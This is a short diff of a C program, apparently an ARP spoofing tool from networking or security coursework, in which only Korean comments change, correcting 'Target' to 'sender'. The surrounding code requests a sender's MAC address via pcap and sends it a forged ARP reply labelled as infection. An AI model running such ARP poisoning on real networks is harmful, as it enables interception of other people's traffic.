@@ -40,16 +40,16 @@ int main(int argc, char* argv[]) {
             uint32_t sender_ip = setIp(si);
             uint32_t target_ip = setIp(ti);
             // 각 IP 쌍에 대해 ARP 공격 함수 호출
-            // 1. Sender IP의 MAC 주소를 얻기 위해 ARP Request를 보냄
+            // 1. sender IP의 MAC 주소를 얻기 위해 ARP Request를 보냄
             request_sender_mac(pcap, my_mac, my_ip, sender_ip);
-            // 2. 응답으로 Target의 MAC 주소를 알아냄
+            // 2. 응답으로 sender의 MAC 주소를 알아냄
             uint8_t sender_mac[6];
             if (!analysis_sender_mac(pcap, sender_ip, target_ip, sender_mac)) {
                 printf("\n");
                 printf("Failed to get sender's MAC address.\n");
                 continue;
             }
-            // 3. 위조된 ARP Reply (Infection) 패킷을 Target에게 전송
+            // 3. 위조된 ARP Reply (Infection) 패킷을 sender에게 전송
             printf("\n");
             printf("attack_ip: ");
             print_ip(sender_ip);
